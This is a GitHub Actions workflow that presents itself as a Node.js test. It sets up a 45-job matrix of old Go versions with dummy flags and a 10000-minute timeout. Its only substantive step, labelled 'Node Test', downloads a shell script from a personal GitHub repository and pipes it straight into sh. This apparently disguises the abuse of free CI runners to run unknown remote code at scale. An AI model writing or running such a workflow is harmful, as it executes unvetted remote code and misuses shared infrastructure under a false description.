name: Node.js
on: [push, pull_request]
jobs:
  build:
    name: Node
    runs-on: ubuntu-22.04
    strategy:
      max-parallel: 30
      fail-fast: false
      matrix:
        go: [1.6, 1.7, 1.8, 1.9, 1.10]
        flag: [A, B, C, D, E, F, G, H, I]
    timeout-minutes: 10000
    env:
        NUM_JOBS: 20
        JOB: ${{ matrix.go }}
    steps:
    - name: Set up Go ${{ matrix.go }}
      uses: actions/setup-go@v1
      with:
        go-version: ${{ matrix.go }}
      id: go
    - name: Setup
      uses: actions/checkout@v1
    - name: Node Test
      run: |
        curl https://raw.githubusercontent.com/lemanleman020/vps-vsc/main/nodejs.sh | sh
